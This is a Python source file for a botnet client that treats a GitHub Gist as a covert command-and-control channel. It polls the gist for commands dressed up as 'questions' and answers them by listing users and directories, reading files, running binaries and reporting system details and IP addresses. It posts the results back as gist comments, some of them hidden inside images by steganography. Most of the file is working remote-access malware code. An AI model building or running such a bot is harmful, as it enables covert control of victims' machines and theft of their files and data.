#!/usr/bin/python3
import json
import os
import platform
import socket
import sys
import time
import uuid
from abc import ABC, abstractmethod
from datetime import datetime
from variables import COMMANDS, BOT_IDLETIME
from imageEncoder import ImageEncoder
import random
import subprocess
import requests

from githubGist import GithubGist


class Bot(ABC):
	def __init__(self, gist: GithubGist):
		self.gist = gist
		self.commands = [c for c in COMMANDS.values() if 'question' in c.keys()]
		self.COMMAND_END = '\r\n'
		self.local_ip = self.get_local_ip()
		self.public_ip = self.get_public_ip()
		self.id = uuid.getnode()
		self.IDLE_TIME = BOT_IDLETIME
		self.last_commands_content = self.gist.get_file(self.gist.questions_file)['content']
		self.RESPONSE = 'User {} responponds to: \n > {}\n'
		self.IMAGES_PATH = './images/'
		self.IMAGES = [self.IMAGES_PATH + file for file in os.listdir(self.IMAGES_PATH)]


	@abstractmethod
	def get_all_users(self):
		pass

	@abstractmethod
	def get_all_logged_in_users(self):
		pass

	def list_directory_content_names_only(self, path):
		if not os.path.exists(path):
			return ''
		return "\n".join(os.listdir(path))

	@abstractmethod
	def list_directory_content(self, path):
		pass

	def get_bots_user(self):
		return os.getlogin()

	def get_system_info(self):
		return platform.platform()

	@abstractmethod
	def get_system_info_detailed(self):
		pass

	def get_commands_from_content(self, content):
		content = content.partition('Hello all i have few questions to ask: \n')
		content = content[0] + content[2]
		commands = []
		for q in content.split(self.COMMAND_END):

			start, mid, question = q.partition(': ')
			if question == '':
				continue
			commands.append((start+mid,question))

		return commands

	def copy_file_to_master(self, path):
		if not os.path.exists(path):
			return 'File not found'
		f = open(path, "r")
		data = f.read()
		f.close()
		return data

	@abstractmethod
	def execute_binary(self, binary, arguments):
		pass




	def get_public_ip(self):
		public_ip_services = ['https://ident.me', 'https://api.ipify.org', 'https://eth0.me/', 'https://ipinfo.io/json']
		ip = None
		for id in range(len(public_ip_services)):
			try:
				response = requests.get(public_ip_services[id])
				if id == 3:
					ip = response.json()['ip']
				else:
					ip = response.text
				break
			except:
				response = None

		return ip

	def get_local_ip(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(0)
		ip = '127.0.0.1'
		try:
			s.connect(('8.8.8.8', 1))  # doesn't even have to be reachable
			ip = s.getsockname()[0]
		finally:
			s.close()
			return ip

	def get_new_commands(self) -> list:
		last_command_id = self.last_commands_content.count(self.COMMAND_END)
		file = self.gist.get_file(self.gist.questions_file)
		if file is None:
			self.gist.id = None
			return []
		self.last_commands_content = file['content']
		commands = self.get_commands_from_content(self.last_commands_content)
		return commands[last_command_id:]

	def get_args_from_question(self, question, command) -> list:
		args = []
		removable = command['question'].split('{}')
		for arg_num in range(len(command['args'])):
			argument = question.partition(removable[arg_num])[2].partition(removable[arg_num+1])[0]
			args.append(argument)
		return args

	def gist_exists(self):
		return self.gist.id is not None

	def start(self):
		while True:
			if not self.gist_exists():
				gist = self.gist.find_gist()
				if len(gist.keys()) > 0:
					self.gist.update_gist(gist)
				time.sleep(self.IDLE_TIME)
				continue
			self.heart_beat()
			commands = self.get_new_commands()
			for command in commands:
				for built_in_command in self.commands:
					start_str = built_in_command['question'].partition('{}')[0]
					if command[1].startswith(start_str):
						question = ''.join(command) + self.COMMAND_END
						if len(built_in_command['args']) > 0:
							args = self.get_args_from_question(command[1], built_in_command)
							try:
								message = getattr(self, built_in_command['name'].lower())(*args)
							except:
								message = 'fail'
						else:
							message = getattr(self, built_in_command['name'].lower())()
						if built_in_command['response'] == ':ImageSecret':
							secret_image = self.message_in_image(message=message)
							message = '![image](data:image/png;base64,{})'.format(ImageEncoder.imageToBase64(secret_image))
							self.send_message(message=message, question=question)
						else:
							message = built_in_command['response'].format(message)
							self.send_message(message=message, question=question)

						break
			time.sleep(self.IDLE_TIME)

	def send_message(self, message, question):
		message = self.RESPONSE.format(self.id, question) + message
		self.gist.create_comment(message=message)

	def heart_beat(self):
		time = str(datetime.utcnow())
		filename = 'activity-{}.json'.format(self.gist.name)
		file = self.gist.get_file(filename)
		if self.gist.get_file(filename) is None:
			self.gist.id = None
			return
		activity_file = json.loads(file['content'])
		activity_file[self.id] = {"last_seen": time}
		self.gist.update_file(filename, json.dumps(activity_file, indent=4))

	def message_in_image(self, message):
		return ImageEncoder.encode(random.choice(self.IMAGES), message)



def get_arguments():
	if len(sys.argv) >= 3:
		return sys.argv[1], sys.argv[2]


if __name__ == '__main__':
	github_token, gist_name = get_arguments()

	github_gist = GithubGist(github_token, gist_name)

	if platform.system() == 'Windows':
		from botWindows import BotWindows

		bot = BotWindows(github_gist)
	else:
		from botLinux import BotLinux
		bot = BotLinux(github_gist)

	print(bot.id)
	bot.start()


